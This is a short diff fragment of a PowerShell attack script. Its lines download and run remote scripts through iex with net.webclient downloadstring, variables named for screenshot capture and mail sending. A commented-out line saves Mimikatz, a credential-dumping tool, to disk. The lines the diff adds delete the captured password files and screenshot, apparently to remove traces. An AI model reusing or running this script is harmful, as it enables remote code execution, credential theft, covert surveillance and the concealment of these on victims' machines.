@@ -8,3 +8,5 @@ iex((new-object net.webclient).downloadstring($command))
 #(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
 iex((new-object net.webclient).downloadstring($screenshot))
 iex((new-object net.webclient).downloadstring($sendmail))
+rm e:\getpass.*
+rm e:\screen.png
